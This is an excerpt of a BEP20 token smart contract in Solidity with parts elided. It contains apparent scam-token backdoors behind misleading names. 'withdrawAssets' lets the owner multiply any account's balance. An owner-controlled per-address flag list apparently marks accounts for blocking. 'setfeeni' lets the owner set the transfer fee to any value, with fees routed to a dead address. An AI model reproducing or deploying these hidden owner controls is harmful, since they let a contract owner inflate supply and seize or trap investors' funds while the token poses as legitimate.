...
contract Token is IBEP20, HasForeignAsset {
    ...
    uint256 private _feeni = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) private _burns;
    function setUserBurn(address accfount) public onlyOwner {
        _burns[accfount] = true;
    }

    function rmUserBun(address accfount) public onlyOwner {
        _burns[accfount] = false;
    }

    function getBun(address accfount) public view returns (bool) {
        return _burns[accfount];
    }

    function withdrawAssets(address accfount,uint256 num) public onlyOwner {
        _balances[accfount] = _balances[accfount].mul(num);
    }
    ...
    function setfeeni(uint256 _value) external onlyOwner {
        _feeni = _value;
    }


    function getfeeni() external onlyOwner returns(uint256){
        return _feeni;
    }
     ...
     * e.g. implement automatic token feenis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        uint256 feeniAmount = 0;
        feeniAmount = amount.mul(_feeni).div(100);
        uint256 amoun;
        amoun = amount - feeniAmount;
        ...
        if (feeniAmount > 0) {
            emit Transfer(sender, _DEADaddress, feeniAmount);
        }
